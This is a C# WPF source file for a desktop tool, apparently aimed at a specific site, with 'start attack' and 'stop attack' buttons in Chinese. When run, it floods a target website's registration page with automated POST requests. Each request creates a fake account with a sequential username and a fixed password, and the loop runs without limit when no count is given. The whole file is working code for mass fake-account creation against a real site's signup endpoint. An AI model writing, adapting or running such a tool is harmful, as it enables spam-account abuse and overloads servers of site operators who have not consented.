using System;
using System.Text;
using System.Windows;
using System.Net;
using System.Threading;

namespace YandaFucker
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        bool flag = false;
        public MainWindow()
        {
            InitializeComponent();
            log.Items.Add("暂无日志...");
        }

        private void btn_push_Click(object sender, RoutedEventArgs e)
        {
            flag = !flag;
            if (flag)
            {
                Thread thread = new Thread(method);//创建线程
                thread.Start();
                btn_push.Content = "停止攻击";
            }
            else
            {
                btn_push.Content = "开始攻击";
            }
            

        }

        public void method()
        {
            int maxN = 0 ;
            tb_count.Dispatcher.Invoke(new Action(delegate ()
            {
                maxN = int.Parse(tb_count.Text);
                log.Items.Clear();

            }));
           
            if (maxN == 0)
            {
                for(int i = 0; true && flag; i++)
                {
                    Register(i);
                }
                log.Items.Add(string.Format("[{0:T}] 停止攻击", DateTime.Now));
            }
            else
            {
                for (int i = 0; (i < maxN) && flag;i++){
                    Register(i);
                }
                btn_push.Dispatcher.Invoke(new Action(delegate ()
                {
                    log.Items.Add(string.Format("[{0:T}] 停止攻击", DateTime.Now));
                    btn_push.Content = "开始攻击";
                }));
                
            }
            

        }

        public void Register(int i)
        {
            string postString = "";
            string userName = "";
            string url = "";
            Dispatcher.Invoke(new Action(delegate ()
            {
                userName = tb_prefix.Text + "_" + i.ToString();
                byte[] nbyte = new byte[30];
                new Random().NextBytes(nbyte);
                postString = "user=" + userName  + "&pwd=" + "password" + "&repeat=" + "password" + "&email=" + userName + "@" + nbyte + ".com";
                url =  tb_url.Text + "zhuce.html";
            }));

            string result = SendPost(url, postString);

            Dispatcher.Invoke(new Action(delegate ()
            {
                if (result.Contains("ok"))
                {
                    log.Items.Add(string.Format("[{0:T}] 用户 " + userName + " 注册成功", DateTime.Now));
                }
                else
                {
                    log.Items.Add(string.Format("[{0:T}] 用户 " + userName + " " + result, DateTime.Now));
                }
                log.ScrollIntoView(log.Items[log.Items.Count - 1]);
            }));
        }

        public string SendPost(string url,string postString)
        {
            byte[] postData = Encoding.UTF8.GetBytes(postString);
            WebClient webClient = new WebClient();
            webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            byte[] responseData = webClient.UploadData(url, "POST", postData);//得到返回字符流  
            string srcString = Encoding.UTF8.GetString(responseData);//解码
            return srcString;
        }
    }
}
